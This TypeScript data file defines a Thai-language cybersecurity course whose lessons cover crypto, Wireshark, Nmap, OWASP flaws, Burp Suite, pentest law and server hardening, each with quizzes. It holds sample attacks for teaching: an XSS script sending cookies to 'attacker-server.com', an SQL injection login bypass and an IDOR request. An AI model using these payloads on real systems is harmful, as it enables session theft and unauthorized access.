import { Course } from "../types";

export const cybersecurityCourse: Course = {
  id: "cybersecurity",
  title: "Cybersecurity",
  description: "เรียนรู้ความปลอดภัยทางไซเบอร์ การเข้ารหัสลับ วิเคราะห์ช่องโหว่ OWASP และการทดสอบเจาะระบบอย่างมีจริยธรรม",
  longDescription: "หลักสูตรความปลอดภัยทางไซเบอร์ที่เข้มข้นที่สุด ครอบคลุมตั้งแต่นิยามความมั่นคงปลอดภัยสารสนเทศ (CIA Triad), การเข้ารหัสและถอดรหัสลับ (Cryptography), การดักจับวิเคราะห์มัลแวร์และแพ็กเก็ตด้วย Wireshark, การสแกนพอร์ตด้วย Nmap, การเจาะลึกช่องโหว่เว็บแอปพลิเคชันตามมาตรฐาน OWASP Top 10 (SQL Injection, XSS), ตลอดจนจรรยาบรรณและข้อกฎหมาย พ.ร.บ. คอมพิวเตอร์",
  icon: "🔒",
  color: "pink",
  gradient: "from-fuchsia-500 to-pink-600",
  totalLessons: 9,
  difficulty: "ขั้นสูง",
  tags: ["Cybersecurity", "OWASP", "Penetration Testing", "Wireshark", "Nmap", "Burp Suite", "Kali Linux"],
  recommendedTools: [
    {
      name: "Kali Linux",
      icon: "🐉",
      badge: "Penetration Testing OS",
      description: "ระบบปฏิบัติการมาตรฐานอันดับ 1 ของโลกสำหรับผู้เชี่ยวชาญด้านความปลอดภัยทางไซเบอร์ รวบรวมเครื่องมือ Security มากกว่า 600 ชนิดในตัว ติดตั้งบน VirtualBox หรือ VMware ได้ฟรี",
      downloadUrl: "https://www.kali.org/get-kali/",
      setupGuide: "1. ดาวน์โหลด Kali Linux Virtual Machine image (สำหรับ VirtualBox หรือ VMware)\n2. เปิดไฟล์ OVA ใน VirtualBox แล้วกด Start\n3. ล็อกอินด้วย Default user: kali / password: kali\n4. อัปเดตแพ็กเกจด้วยคำสั่ง: sudo apt update && sudo apt upgrade"
    },
    {
      name: "Burp Suite Community",
      icon: "🎯",
      badge: "Web Security Proxy",
      description: "เครื่องมือทดสอบความปลอดภัยเว็บแอปพลิเคชันระดับแนวหน้า ทำหน้าที่เป็น Man-in-the-Middle Proxy ดักจับ แก้ไข และส่งซ้ำคำขอ HTTP/HTTPS ได้อย่างอิสระ",
      downloadUrl: "https://portswigger.net/burp/communitydownload",
      setupGuide: "1. ดาวน์โหลดติดตั้ง Burp Suite Community Edition\n2. เปิดโปรแกรม เลือก Temporary Project\n3. ไปที่แท็บ Proxy > Open Browser เพื่อเปิดบราวเซอร์ที่ตั้งค่าผ่าน Proxy อัตโนมัติ\n4. ตรวจสอบการดักจับแพ็กเก็ตในแท็บ Intercept"
    },
    {
      name: "Nmap Network Mapper",
      icon: "🔍",
      badge: "Port Scanner",
      description: "เครื่องมือสแกนเครือข่ายและค้นหาพอร์ตที่เปิดอยู่ (Open Ports) ตรวจหาเวอร์ชันของเซอร์วิส และระบบปฏิบัติการของเป้าหมาย",
      downloadUrl: "https://nmap.org/download.html",
      setupGuide: "1. ดาวน์โหลด Nmap สำหรับ Windows หรือรันผ่าน Terminal ใน Linux\n2. เปิด Command Prompt หรือ Terminal\n3. พิมพ์: nmap -sV scanme.nmap.org เพื่อทดลองสแกนเครื่องทดสอบทางการ"
    }
  ],
  lessons: [
    // ---------------- ระดับเริ่มต้น (Beginner) ----------------
    {
      id: "cyber-1",
      title: "เสาหลักความปลอดภัยสารสนเทศ (CIA Triad) และประเภทภัยคุกคาม",
      description: "ทำความเข้าใจ Confidentiality, Integrity, Availability, สิทธิ์ Least Privilege และการจำแนกประเภท Black Hat vs White Hat",
      duration: "35 นาที",
      level: "เริ่มต้น",
      content: `# เสาหลัก 3 ประการของความมั่นคงปลอดภัยสารสนเทศ (CIA Triad)

ในวงการไซเบอร์ซีเคียวริตี้ มาตรการป้องกันทั้งหมดถูกออกแบบมาเพื่อปกป้อง **CIA Triad**:

1. **Confidentiality (การรักษาความลับ):** ข้อมูลต้องเข้าถึงได้เฉพาะผู้มีสิทธิ์เท่านั้น เช่น ผลคะแนนสอบ รหัสผ่าน หรือข้อมูลบัตรประชาชน (มาตรการ: เข้ารหัส Encryption, การยืนยันตัวตน MFA)
2. **Integrity (ความถูกต้องสมบูรณ์):** ข้อมูลต้องไม่ถูกดัดแปลง ปลอมแปลง หรือลบทิ้งโดยไม่ได้รับอนุญาต (มาตรการ: เช็คซัม Hash, Digital Signature)
3. **Availability (ความพร้อมใช้งาน):** ระบบและข้อมูลต้องพร้อมให้บริการแก่ผู้ใช้งานเสมอเมื่อต้องการ (มาตรการ: มีเซิร์ฟเวอร์สำรอง Redundancy, ป้องกันการโจมตี DDoS)

## หลักการสิทธิ์ขั้นต่ำ (Principle of Least Privilege - PoLP)
ผู้ใช้งานทุกคน รวมถึงโปรแกรมและ Service ควรได้รับสิทธิ์ในการเข้าถึงระบบ **เท่าที่จำเป็นต่อการปฏิบัติงานเท่านั้น** เพื่อลดความเสียหายเมื่อบัญชีถูกแฮก`,
      codeExample: {
        language: "bash",
        code: `# ตัวอย่างการกำหนดสิทธิ์แบบ Least Privilege บนระบบ Linux
# ให้สิทธิ์เฉพาะเจ้าของไฟล์อ่านและแก้ไขได้เท่านั้น (Read/Write)
chmod 600 /etc/secure/secret_keys.pem

# ตรวจสอบสิทธิ์ของไฟล์
ls -l /etc/secure/secret_keys.pem
# ผลลัพธ์: -rw------- 1 root root ...`,
        description: "การกำหนดสิทธิ์ไฟล์แบบรัดกุมตามหลัก Least Privilege บน Linux"
      },
      quiz: [
        { id: "cy-1-q1", question: "การโจมตีประเภท DDoS (Distributed Denial of Service) ส่งผลกระทบโดยตรงต่อเสาหลักใดใน CIA Triad?", options: ["Confidentiality", "Integrity", "Availability (ความพร้อมใช้งาน)", "Authorization"], correctAnswer: 2, explanation: "DDoS ส่งทราฟฟิกมหาศาลเข้าโจมตีเซิร์ฟเวอร์เพื่อให้ระบบล่ม ผู้ใช้จริงเข้าใช้งานไม่ได้ จึงทำลายเสาหลักด้าน Availability" }
      ]
    },
    {
      id: "cyber-2",
      title: "วิทยาการรหัสลับ (Cryptography): Symmetric, Asymmetric และ Hashing",
      description: "เจาะลึก AES-256, RSA Public/Private Key, ฟังก์ชันแฮช SHA-256 และการลงลายมือชื่อดิจิทัล (Digital Signature)",
      duration: "45 นาที",
      level: "เริ่มต้น",
      content: `# วิทยาการรหัสลับ (Cryptography)

การเข้ารหัสลับคือกระบวนการแปลงข้อความธรรมดา (Plaintext) ให้กลายเป็นข้อความที่อ่านไม่รู้เรื่อง (Ciphertext)

## 3 เสาหลักของการเข้ารหัส
1. **Symmetric Encryption (กุญแจสมมาตร):** ใช้กุญแจตัวเดียวกันทั้งในการเข้ารหัสและถอดรหัส (เช่น **AES-256**) มีความเร็วสูงมาก เหมาะกับการเข้ารหัสไฟล์และฮาร์ดดิสก์
2. **Asymmetric Encryption (กุญแจอสมมาตร):** มีคู่กุญแจ 2 ดอก
   - **Public Key (กุญแจสาธารณะ):** แจกจ่ายให้ทุกคนใช้เพื่อ 'เข้ารหัส' ข้อมูลส่งมาหาเรา
   - **Private Key (กุญแจส่วนตัว):** เก็บรักษาเป็นความลับสุดยอด ใช้สำหรับ 'ถอดรหัส' ข้อมูลเท่านั้น (เช่น **RSA, ECC**)
3. **Cryptographic Hashing (ฟังก์ชันแฮชทางเดียว):** แปลงข้อมูลขนาดใดก็ได้ให้กลายเป็นสตริงความยาวคงที่ (เช่น **SHA-256**) ไม่สามารถถอดรหัสกลับได้`,
      codeExample: {
        language: "python",
        code: `import hashlib

def calculate_sha256(text):
    return hashlib.sha256(text.encode('utf-8')).hexdigest()

# สังเกตว่าแม้จะเปลี่ยนข้อความเพียงตัวอักษรเดียว ผลลัพธ์ Hash จะเปลี่ยนไปโดยสิ้นเชิง (Avalanche Effect)
hash1 = calculate_sha256("Hello, IT Academy!")
hash2 = calculate_sha256("Hello, IT Academy?")

print("Hash 1:", hash1)
print("Hash 2:", hash2)`,
        description: "การคำนวณแฮช SHA-256 ในภาษา Python และการเกิด Avalanche Effect"
      },
      quiz: [
        { id: "cy-2-q1", question: "ในระบบการเข้ารหัสแบบ Asymmetric หากนาย A ต้องการส่งข้อความลับไปหานาย B นาย A จะต้องใช้กุญแจใดในการเข้ารหัส?", options: ["Private Key ของนาย A", "Public Key ของนาย B", "Private Key ของนาย B", "Public Key ของนาย A"], correctAnswer: 1, explanation: "ต้องใช้ Public Key ของผู้รับ (นาย B) ในการเข้ารหัส เพื่อให้มีเพียงผู้รับคนเดียวที่ครอบครอง Private Key ที่ตรงกันเป็นผู้ถอดรหัสได้" }
      ]
    },
    {
      id: "cyber-3",
      title: "การดักจับและวิเคราะห์ทราฟฟิกเครือข่ายด้วย Wireshark",
      description: "ดักจับแพ็กเก็ตจริงในเครือข่าย, สังเกตขั้นตอน TCP Three-Way Handshake (SYN, SYN-ACK, ACK), และเปรียบเทียบ HTTP vs HTTPS",
      duration: "50 นาที",
      level: "เริ่มต้น",
      content: `# การวิเคราะห์ความปลอดภัยเครือข่ายด้วย Wireshark

โปรแกรม **Wireshark** ช่วยให้ผู้ดูแลระบบมองเห็นทุกแพ็กเก็ตที่วิ่งผ่านสายสัญญาณ เพื่อตรวจหาทราฟฟิกที่ผิดปกติหรือการบุกรุก

## 1. ขั้นตอนการจับมือเชื่อมต่อ TCP (Three-Way Handshake)
ก่อนที่คอมพิวเตอร์จะส่งข้อมูลหากันได้ จะต้องมีกระบวนการจับมือ 3 ขั้นตอนเสมอ:
1. **Client $\\rightarrow$ Server:** ส่งแพ็กเก็ต \`[SYN]\` (ขอเชื่อมต่อ พร้อม Sequence Number เริ่มต้น)
2. **Server $\\rightarrow$ Client:** ตอบกลับด้วย \`[SYN, ACK]\` (ตอบรับและยืนยัน)
3. **Client $\\rightarrow$ Server:** ตอบกลับด้วย \`[ACK]\` (การเชื่อมต่อสมบูรณ์ เริ่มส่งข้อมูลได้)

## 2. ความอันตรายของ HTTP ธรรมดา
เมื่อผู้ใช้ล็อกอินผ่านเว็บที่เป็น HTTP (ไม่มีการเข้ารหัส SSL/TLS) ข้อมูล Username และ Password จะลอยผ่านเครือข่ายเป็นตัวอักษรธรรมดา ผู้ดักฟังสามารถคลิกขวาใน Wireshark แล้วเลือก **Follow > TCP Stream** เพื่ออ่านรหัสผ่านได้ทันที!`,
      codeExample: {
        language: "bash",
        code: `# ฟิลเตอร์ค้นหาที่ใช้บ่อยในโปรแกรม Wireshark:

# กรองเฉพาะทราฟฟิกเว็บพอร์ต 80 (HTTP)
tcp.port == 80

# กรองเฉพาะคำขอ DNS
dns

# กรองเฉพาะแพ็กเก็ตที่มีการส่งข้อมูลล็อกอิน POST
http.request.method == "POST"

# กรองดูเฉพาะคำสั่ง Ping (ICMP)
icmp`,
        description: "ชุดตัวกรอง Display Filter สำหรับค้นหาแพ็กเก็ตในโปรแกรม Wireshark"
      },
      quiz: [
        { id: "cy-3-q1", question: "ขั้นตอนที่ 2 ของกระบวนการ TCP Three-Way Handshake คือแฟล็กใดที่เซิร์ฟเวอร์ส่งกลับมาหาไคลเอนต์?", options: ["SYN", "ACK", "SYN-ACK", "FIN-ACK"], correctAnswer: 2, explanation: "เซิร์ฟเวอร์จะตอบกลับด้วยแพ็กเก็ต SYN-ACK (Synchronize-Acknowledge)" }
      ]
    },

    // ---------------- ระดับปานกลาง (Intermediate) ----------------
    {
      id: "cyber-4",
      title: "การสแกนเครือข่ายและการสำรวจเป้าหมายด้วย Nmap",
      description: "เรียนรู้เทคนิค TCP SYN Scan (-sS), Service Version Detection (-sV), OS Detection (-O), และการใช้ Nmap Scripting Engine (NSE)",
      duration: "55 นาที",
      level: "ปานกลาง",
      content: `# การสำรวจเครือข่ายและค้นหาช่องโหว่ด้วย Nmap

ก่อนที่นักทดสอบเจาะระบบ (Penetration Tester) จะเริ่มหาช่องโหว่ ขั้นตอนแรกคือการทำ **Reconnaissance (สำรวจเป้าหมาย)** เพื่อดูว่าเครื่องเป้าหมายเปิดพอร์ตใดไว้บ้าง

## เทคนิคการสแกนของ Nmap
- **TCP SYN Scan (\`-sS\` - Stealth Scan):** ส่งแพ็กเก็ต SYN แล้วส่ง RST ยกเลิกก่อนการเชื่อมต่อเสร็จสมบูรณ์ ทำให้เซิร์ฟเวอร์บางตัวไม่บันทึก Log การสแกน
- **Service Version Detection (\`-sV\`):** ตรวจสอบเวอร์ชันของโปรแกรมที่รันอยู่บนพอร์ตนั้นๆ (เช่น Apache 2.4.41 หรือ OpenSSH 8.2) เพื่อนำไปค้นหาช่องโหว่ที่รู้จัก (CVE)`,
      codeExample: {
        language: "bash",
        code: `# สแกนพอร์ตแบบเร็วและตรวจเวอร์ชันของเซอร์วิส (Educational Test Server)
nmap -sS -sV -T4 scanme.nmap.org

# สแกนพอร์ตทั้งหมด 1-65535 พร้อมระบบปฏิบัติการ
sudo nmap -p- -O 192.168.1.100

# เรียกใช้สคริปต์ตรวจช่องโหว่อัตโนมัติ (NSE Vulnerability Scripts)
nmap --script vuln 192.168.1.100`,
        description: "คำสั่ง Nmap ที่ใช้ในการตรวจสอบพอร์ตและประเมินช่องโหว่ของเป้าหมาย"
      },
      quiz: [
        { id: "cy-4-q1", question: "เหตุใดการรู้หมายเลขเวอร์ชันของซอฟต์แวร์ (Service Version) บนเซิร์ฟเวอร์เป้าหมายจึงมีความสำคัญอย่างยิ่งต่อนักทดสอบเจาะระบบ?", options: ["ช่วยให้ดาวน์โหลดไฟล์ได้เร็วขึ้น", "ช่วยให้นำไปค้นหาในฐานข้อมูลช่องโหว่สาธารณะ (CVE Database) ว่ามีช่องโหว่ที่ยังไม่ได้แพตช์หรือไม่", "ช่วยประหยัดค่าอินเทอร์เน็ต", "ไม่มีความสำคัญ"], correctAnswer: 1, explanation: "การทราบเวอร์ชันที่แน่ชัดช่วยให้นำไปเปรียบเทียบกับฐานข้อมูล CVE (Common Vulnerabilities and Exposures) เพื่อหา Exploit ที่ตรงกันได้" }
      ]
    },
    {
      id: "cyber-5",
      title: "ช่องโหว่เว็บ OWASP Top 10 ตอนที่ 1: SQL Injection (SQLi)",
      description: "ทำความเข้าใจสาเหตุของ SQL Injection, การโจมตีแบบ ' OR '1'='1, Union-Based SQLi, และการแก้ไขด้วย Parameterized Queries",
      duration: "60 นาที",
      level: "ปานกลาง",
      content: `# การเจาะลึกช่องโหว่ SQL Injection (SQLi)

**SQL Injection** คือช่องโหว่อันดับต้นๆ ของโลก เกิดจากการที่โปรแกรมเมอร์นำข้อมูลที่ผู้ใช้พิมพ์เข้ามาไปต่อสตริง (String Concatenation) เข้ากับคำสั่ง SQL โดยตรงโดยไม่มีการตรวจสอบ (Sanitization)

## ตัวอย่างกลไกการโจมตี
โค้ดที่มีช่องโหว่:
\`\`\`sql
SELECT * FROM users WHERE username = '$user_input' AND password = '$password_input';
\`\`\`
หากผู้โจมตีกรอกในช่อง Username ว่า:
\`' OR '1'='1' --\`

คำสั่ง SQL จะกลายเป็น:
\`\`\`sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...';
\`\`\`
เนื่องจากเงื่อนไข \`'1'='1'\` เป็นจริงเสมอ และเครื่องหมาย \`--\` คือการคอมเมนต์ละเว้นการเช็ครหัสผ่านทิ้งไป ทำให้ผู้โจมตีล็อกอินเข้าสู่ระบบในฐานะ Admin ได้ทันทีโดยไม่ต้องรู้รหัสผ่าน!`,
      codeExample: {
        language: "python",
        code: `import sqlite3

# ❌ วิธีการที่อันตรายและมีช่องโหว่ SQL Injection (ห้ามทำเด็ดขาด!)
def bad_login(username, password):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    # execute(query) ...

# ✅ วิธีการที่ถูกต้องและปลอดภัย 100% ด้วย Parameterized Query (Prepared Statement)
def secure_login(username, password):
    conn = sqlite3.connect('academy.db')
    cursor = conn.cursor()
    # เครื่องหมาย ? จะถูกฐานข้อมูลมองว่าเป็นข้อมูลดิบเท่านั้น ไม่สามารถถูกตีความเป็นโค้ด SQL ได้
    cursor.execute(
        "SELECT id, username, role FROM users WHERE username = ? AND password = ?",
        (username, password)
    )
    user = cursor.fetchone()
    conn.close()
    return user`,
        description: "การเปรียบเทียบโค้ดที่มีช่องโหว่ SQL Injection กับวิธีป้องกันด้วย Prepared Statements"
      },
      quiz: [
        { id: "cy-5-q1", question: "มาตรการป้องกันช่องโหว่ SQL Injection ที่มีประสิทธิภาพสูงสุดและเป็นมาตรฐานสากลคือข้อใด?", options: ["การปิดเซิร์ฟเวอร์ตอนกลางคืน", "การใช้ Prepared Statements / Parameterized Queries", "การเปลี่ยนรหัสผ่านทุกวัน", "การลบตารางฐานข้อมูลทิ้ง"], correctAnswer: 1, explanation: "Prepared Statements แยกคำสั่ง SQL กับข้อมูลของผู้ใช้ออกจากกันโดยเด็ดขาด ทำให้คำสั่ง SQL ไม่สามารถถูกบิดเบือนได้" }
      ]
    },
    {
      id: "cyber-6",
      title: "ช่องโหว่เว็บ OWASP Top 10 ตอนที่ 2: Cross-Site Scripting (XSS) & CSRF",
      description: "เจาะลึก Stored XSS, Reflected XSS, การขโมย Cookie Session, และการป้องกันด้วย Content Security Policy (CSP) และ HttpOnly Cookies",
      duration: "55 นาที",
      level: "ปานกลาง",
      content: `# การโจมตีฝั่งไคลเอนต์: Cross-Site Scripting (XSS)

XSS เกิดจากการที่เว็บแอปพลิเคชันรับโค้ด JavaScript ที่ผู้ไม่หวังดีป้อนเข้ามา แล้วนำไปแสดงผลบนหน้าจอของเหยื่อรายอื่นโดยไม่ได้ทำการ Encode ตัวอักษรพิเศษ

## ประเภทของ XSS
1. **Stored XSS:** โค้ดอันตรายถูกบันทึกลงฐานข้อมูล (เช่น โพสต์ในเว็บบอร์ด) เมื่อใครเปิดดูกระทู้นั้น สคริปต์จะถูกรันบนเครื่องของทุกคน
2. **Reflected XSS:** โค้ดส่งผ่าน URL Parameter เข้าไปแล้วสะท้อนกลับมาบนหน้าจอทันที

## สิ่งที่แฮกเกอร์ทำได้ผ่าน XSS
- แอบอ่าน \`document.cookie\` เพื่อขโมย Session ID ไปสวมรอยเป็นผู้ใช้
- ทำการ Redirect เหยื่อไปยังหน้าเว็บ Phishing ปลอมเพื่อหลอกเอาข้อมูล
- แอบดักจับการพิมพ์คีย์บอร์ด (Keylogger บนเบราว์เซอร์)`,
      codeExample: {
        language: "html",
        code: `<!-- ตัวอย่าง Payload XSS ที่แฮกเกอร์ใช้ขโมย Cookie ส่งกลับเซิร์ฟเวอร์ตนเอง -->
<script>
  fetch('https://attacker-server.com/steal?cookie=' + encodeURIComponent(document.cookie));
</script>

<!-- มาตรการป้องกัน: การตั้งค่า Cookie แบบ HttpOnly เพื่อไม่ให้ JavaScript เข้าถึงได้ -->
Set-Cookie: session_token=xyz123; Secure; HttpOnly; SameSite=Strict`,
        description: "ตัวอย่าง Payload การขโมย Cookie ผ่าน XSS และการป้องกันด้วยแอตทริบิวต์ HttpOnly"
      },
      quiz: [
        { id: "cy-6-q1", question: "แอตทริบิวต์ใดใน HTTP Cookie ที่ช่วยป้องกันไม่ให้โค้ด JavaScript (XSS) สามารถเข้าถึงและขโมย Cookie นั้นได้?", options: ["Secure", "HttpOnly", "SameSite", "Path"], correctAnswer: 1, explanation: "HttpOnly บล็อกการเข้าถึง Cookie ผ่าน document.cookie จากฝั่ง JavaScript โดยสิ้นเชิง" }
      ]
    },

    // ---------------- ระดับขั้นสูง (Advanced) ----------------
    {
      id: "cyber-7",
      title: "การใช้งาน Burp Suite ในการดักจับและปรับแต่ง HTTP Requests",
      description: "คอนฟิก Intercepting Proxy, การส่งซ้ำคำขอด้วย Repeater, การทดสอบข้ามสิทธิ์ Broken Access Control (IDOR)",
      duration: "65 นาที",
      level: "ขั้นสูง",
      content: `# การทดสอบความปลอดภัยด้วย Burp Suite

**Burp Suite** คือเครื่องมืออันดับหนึ่งที่ Web Penetration Tester ขาดไม่ได้ โดยทำหน้าที่เป็นตัวกลาง (Proxy) ดักอยู่ระหว่างเบราว์เซอร์และเว็บเซิร์ฟเวอร์

## ฟังก์ชันสำคัญของ Burp Suite
- **Proxy Intercept:** สั่งหยุดคำขอ HTTP ไว้กลางอากาศ เพื่อให้นักทดสอบแก้ไขค่าพารามิเตอร์ก่อนปล่อยให้ส่งไปถึงเซิร์ฟเวอร์
- **Repeater:** เครื่องมือส่งคำขอเดิมซ้ำๆ พร้อมปรับเปลี่ยนค่าตัวแปร เพื่อทดสอบการตอบสนองของเซิร์ฟเวอร์ได้อย่างสะดวกรวดเร็ว
- **ช่องโหว่ IDOR (Insecure Direct Object References):** เช่น เปลี่ยนค่า \`student_id=101\` เป็น \`student_id=102\` ในคำขอ แล้วตรวจสอบว่าเซิร์ฟเวอร์ยอมให้ดูข้อมูลของเพื่อนโดยไม่มีการตรวจสิทธิ์หรือไม่`,
      codeExample: {
        language: "http",
        code: `POST /api/change-password HTTP/1.1
Host: school-system.local
Content-Type: application/json
Cookie: session_id=abc123token

{
  "user_id": 105,
  "new_password": "HackedPassword123"
}
/* แฮกเกอร์ลองเปลี่ยน user_id เป็น 1 (Admin) 
   หากระบบไม่มีการตรวจสอบสิทธิ์ว่าคนล็อกอินคือ user 1 หรือไม่ 
   รหัสผ่านของ Admin จะถูกเปลี่ยนทันที (IDOR) */`,
        description: "ตัวอย่างการดักจับและแก้ไข HTTP Request ใน Burp Suite เพื่อทดสอบช่องโหว่สิทธิ์การเข้าถึง"
      },
      quiz: [
        { id: "cy-7-q1", question: "ในโปรแกรม Burp Suite แท็บใดใช้สำหรับทดลองส่งคำขอ HTTP ซ้ำๆ และแก้ไขค่าพารามิเตอร์เพื่อดูผลลัพธ์ได้อย่างสะดวกที่สุด?", options: ["Target", "Proxy", "Repeater", "Decoder"], correctAnswer: 2, explanation: "Repeater ออกแบบมาสำหรับส่งคำขอซ้ำและแก้ไข Payload เพื่อสังเกตการณ์ตอบสนองของเซิร์ฟเวอร์" }
      ],
      labGuide: {
        title: "แล็บดักจับคำขอแรกด้วย Burp Suite Community",
        toolName: "Burp Suite Community",
        downloadUrl: "https://portswigger.net/burp/communitydownload",
        objective: "เปิดโปรแกรม Burp Suite เปิดเบราว์เซอร์ในตัว ทดสอบดักจับคำขอ HTTP และทดลองแก้ไขค่าใน Repeater",
        steps: [
          { title: "เปิดโปรแกรม", detail: "เปิด Burp Suite Community เลือก Temporary project > Use Burp defaults" },
          { title: "เปิด Browser", detail: "ไปที่แท็บ Proxy เลือก Open Browser เพื่อเปิดเบราว์เซอร์ที่คอนฟิก Proxy ไว้เรียบร้อยแล้ว" },
          { title: "เปิด Intercept", detail: "ตรวจสอบว่าปุ่ม 'Intercept is on' ทำงานอยู่" },
          { title: "ทดลองเข้าเว็บ", detail: "พิมพ์ URL ในเบราว์เซอร์ สังเกตว่าหน้าเว็บจะหยุดโหลด และข้อความคำขอจะปรากฏในหน้าต่าง Burp Suite" },
          { title: "ส่งเข้า Repeater", detail: "คลิกขวาที่ข้อความคำขอ เลือก 'Send to Repeater' (Ctrl+R) แล้วกดส่งในแท็บ Repeater" }
        ],
        verification: "ในแท็บ Repeater เมื่อกดปุ่ม Send จะต้องเห็นข้อความตอบกลับ HTTP/1.1 200 OK จากเซิร์ฟเวอร์"
      }
    },
    {
      id: "cyber-8",
      title: "ระเบียบวิธีทดสอบเจาะระบบและกฎหมาย พ.ร.บ. คอมพิวเตอร์",
      description: "ขั้นตอน Penetration Testing (Recon, Scan, Exploit, Post-Exploit, Report) จรรยาบรรณ และมาตราสำคัญในกฎหมายไซเบอร์",
      duration: "60 นาที",
      level: "ขั้นสูง",
      content: `# ระเบียบวิธีทดสอบเจาะระบบ (Penetration Testing Methodology)

ความแตกต่างระหว่าง **แฮกเกอร์หมวกดำ (Black Hat)** และ **ผู้เชี่ยวชาญด้านความปลอดภัย (White Hat / Ethical Hacker)** ไม่ใช่เรื่องของความรู้หรือเครื่องมือ แต่คือ **ความยินยอมและกฎหมาย**

## 5 ขั้นตอนมาตรฐานของการทำ Penetration Testing
1. **Planning & Reconnaissance:** กำหนดขอบเขต (Scope of Work) และได้รับหนังสืออนุญาตเป็นลายลักษณ์อักษร (Letter of Authorization)
2. **Scanning & Enumeration:** สแกนพอร์ตและวิเคราะห์เวอร์ชันของระบบ
3. **Gaining Access (Exploitation):** ใช้ช่องโหว่เพื่อเข้าถึงระบบตามขอบเขตที่ตกลงกัน
4. **Maintaining Access & Analysis:** ประเมินระดับความเสียหายที่อาจเกิดขึ้นหากถูกผู้ไม่หวังดีโจมตีจริง
5. **Reporting (การจัดทำรายงาน):** ส่งมอบรายงานสรุปช่องโหว่ พร้อม **แนวทางการแก้ไข (Remediation Plan)** ให้แก่ผู้บริหารและทีมผู้พัฒนา

## ข้อกฎหมาย พ.ร.บ. ว่าด้วยการกระทำความผิดเกี่ยวกับคอมพิวเตอร์
- **มาตรา 5:** เข้าถึงระบบคอมพิวเตอร์ของผู้อื่นโดยมิชอบ (จำคุกไม่เกิน 6 เดือน หรือปรับไม่เกิน 1 หมื่นบาท)
- **มาตรา 7:** เข้าถึงข้อมูลคอมพิวเตอร์ที่มีมาตรการป้องกันโดยมิชอบ (จำคุกไม่เกิน 2 ปี)
- **มาตรา 9-10:** แก้ไข ดัดแปลง หรือทำให้ระบบคอมพิวเตอร์ผู้อื่นเสียหาย (DDoS)`,
      codeExample: {
        language: "markdown",
        code: `# โครงสร้างรายงานการทดสอบเจาะระบบ (Executive Summary Template)
1. ข้อมูลโครงการและขอบเขต (Scope of Assessment)
2. สรุปภาพรวมความเสี่ยง (Executive Risk Summary)
   - ระดับวิกฤต (Critical): 1 รายการ
   - ระดับสูง (High): 2 รายการ
   - ระดับปานกลาง (Medium): 4 รายการ
3. รายละเอียดช่องโหว่ทีละรายการ พร้อมขั้นตอนการทำซ้ำ (Proof of Concept)
4. คำแนะนำในการปิดช่องโหว่ (Actionable Remediation Roadmap)`,
        description: "โครงสร้างมาตรฐานของรายงานผลการทดสอบเจาะระบบสำหรับองค์กร"
      },
      quiz: [
        { id: "cy-8-q1", question: "เอกสารสำคัญที่สุดที่นักทดสอบเจาะระบบ (Penetration Tester) ต้องได้รับก่อนเริ่มลงมือทดสอบระบบของลูกค้าคือข้อใด?", options: ["ใบกำกับภาษี", "หนังสือยินยอมและมอบอำนาจอย่างเป็นทางการ (Letter of Authorization / Permission to Attack)", "คู่มือระบบ", "บัตรประชาชนลูกค้า"], correctAnswer: 1, explanation: "ต้องมีหนังสือยินยอมและมอบอำนาจเป็นลายลักษณ์อักษรกำหนดขอบเขตอย่างชัดเจน มิฉะนั้นจะมีความผิดตามกฎหมายอาญา" }
      ]
    },
    {
      id: "cyber-9",
      title: "โปรเจกต์ใหญ่: การตั้งค่าระบบป้องกันและตรวจจับความปลอดภัย (Hardening & Defense)",
      description: "เสริมเกราะป้องกันเซิร์ฟเวอร์ Linux: ปิดรหัสผ่านใช้ SSH Key, ติดตั้ง UFW Firewall, ติดตั้ง Fail2ban ป้องกัน Brute-force",
      duration: "80 นาที",
      level: "ขั้นสูง",
      content: `# การเสริมสร้างความมั่นคงปลอดภัยให้ระบบเซิร์ฟเวอร์ (Server Hardening)

ในบทเรียนสุดท้ายนี้ เราจะสวมบทบาทเป็น **Blue Team (ทีมตั้งรับ)** เพื่อปิดช่องโหว่และเสริมเกราะป้องกันให้แก่เซิร์ฟเวอร์ขององค์กร

## มาตรการเสริมความปลอดภัยหลัก
1. **SSH Key-Based Authentication:** ปิดการล็อกอินด้วยรหัสผ่าน (Password Authentication) เปลี่ยนมาใช้คู่กุญแจ Public/Private Key 4096-bit ซึ่งไม่สามารถถูกโจมตีด้วย Brute Force ได้
2. **UFW (Uncomplicated Firewall):** ปิดพอร์ตทั้งหมด เปิดเฉพาะพอร์ตที่จำเป็น เช่น 80, 443, 22
3. **Fail2ban:** โปรแกรมตรวจจับการพยายามล็อกอินผิดซ้ำๆ และสั่งบล็อก IP Address นั้นลงใน Firewall อัตโนมัติเป็นเวลา 24 ชั่วโมง`,
      codeExample: {
        language: "bash",
        code: `# 1. สร้างคู่กุญแจ SSH บนเครื่องคอมพิวเตอร์ของคุณ
ssh-keygen -t ed25519 -C "admin@itacademy.com"

# 2. ปรับแต่งไฟล์ /etc/ssh/sshd_config บนเซิร์ฟเวอร์
# ปิดการล็อกอินด้วย Password
PasswordAuthentication no
# ปิดการล็อกอินของ Root โดยตรง
PermitRootLogin no

# 3. เปิดใช้งานไฟร์วอลล์ UFW
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable

# 4. ตรวจสอบสถานะไฟร์วอลล์
sudo ufw status verbose`,
        description: "ชุดคำสั่งเสริมความปลอดภัยเซิร์ฟเวอร์ Linux ตามมาตรฐานความปลอดภัยสากล"
      },
      quiz: [
        { id: "cy-9-q1", question: "โปรแกรม Fail2ban ช่วยปกป้องเซิร์ฟเวอร์จากการโจมตีประเภทใดเป็นหลัก?", options: ["การโจมตีแบบ Brute-force และ Password Guessing", "การสแกนไวรัสในไฟล์", "การดักฟังสายเคเบิล", "การทำ Phishing ทางอีเมล"], correctAnswer: 0, explanation: "Fail2ban ตรวจสอบไฟล์ Log ของระบบ เมื่อพบการพยายามสุ่มรหัสผ่านผิดเกินกำหนด จะสั่งแบน IP ของผู้โจมตีทันที" }
      ]
    }
  ]
};
